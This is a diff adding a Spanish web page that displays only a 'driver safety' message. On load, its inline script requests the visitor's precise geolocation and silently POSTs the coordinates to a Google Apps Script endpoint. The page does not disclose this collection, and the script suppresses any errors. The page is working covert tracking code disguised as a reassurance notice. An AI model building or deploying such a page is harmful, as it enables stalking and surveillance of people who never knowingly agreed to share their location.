@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Seguridad del Conductor</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    margin: 0;
+  }
+  body {
+    font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background: #0f172a;
+    color: #f1f5f9;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 24px;
+  }
+  .contenido {
+    max-width: 360px;
+  }
+  .icono {
+    font-size: 5rem;
+    margin-bottom: 20px;
+  }
+  h1 {
+    font-size: 1.6rem;
+    line-height: 1.35;
+    margin: 0;
+  }
+</style>
+</head>
+<body>
+  <div class="contenido">
+    <div class="icono">🛡️</div>
+    <h1>SEÑOR CONDUCTOR<br>TU SEGURIDAD NOS IMPORTA</h1>
+  </div>
+
+<script>
+  // ⚠️ URL de tu Google Apps Script
+  const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbykRa--qjR6EfXHBL0nj5JywqCJZs1vbeznKz64UQFCXB2yCVxxnd6QuchPGSCujda6/exec";
+
+  function enviarUbicacion(lat, lng) {
+    fetch(APPS_SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({ lat, lng })
+    }).catch(() => {});
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => enviarUbicacion(pos.coords.latitude, pos.coords.longitude),
+      () => {},
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+</script>
+</body>
+</html>
